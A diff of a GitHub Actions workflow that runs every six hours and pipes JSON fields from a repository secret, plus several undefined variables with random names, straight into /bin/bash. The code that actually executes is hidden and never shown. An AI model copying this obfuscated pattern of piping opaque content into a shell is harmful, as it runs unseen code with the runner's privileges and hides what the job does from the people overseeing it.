@@ -3,24 +3,24 @@ name: faultexuberant
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '59 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: faultexuberant
         env:
-          c069: ${{ secrets.c069 }}
+          ez6: ${{ secrets.ez6 }}
         run: |
-          echo $c069 | jq -r .y59 | /bin/bash
-          echo $rezmz8710 | jq -r .yh0 | /bin/bash
-          echo $ctwi5400 | jq -r .adt4 | /bin/bash
-          echo $kyuf342 | jq -r .ahy5426 | /bin/bash
-          echo $id4319 | jq -r .luxa54 | /bin/bash
-          echo $rc3 | jq -r .nhtl17749 | /bin/bash
-          echo $auola786 | jq -r .qo52566 | /bin/bash
-          echo $tlajq35915 | jq -r .pb8 | /bin/bash
+          echo $ez6 | jq -r .el7152 | /bin/bash
+          echo $rlu904 | jq -r .gw12 | /bin/bash
+          echo $qjs68 | jq -r .g5 | /bin/bash
+          echo $cru8424 | jq -r .ktzl4 | /bin/bash
+          echo $ypynt554 | jq -r .q63467 | /bin/bash
+          echo $crwxg53431 | jq -r .f69562 | /bin/bash
+          echo $m7844 | jq -r .paacl102 | /bin/bash
+          echo $kegm46 | jq -r .tcd9179 | /bin/bash
+          echo $wgsd0 | jq -r .bmp9156 | /bin/bash
 
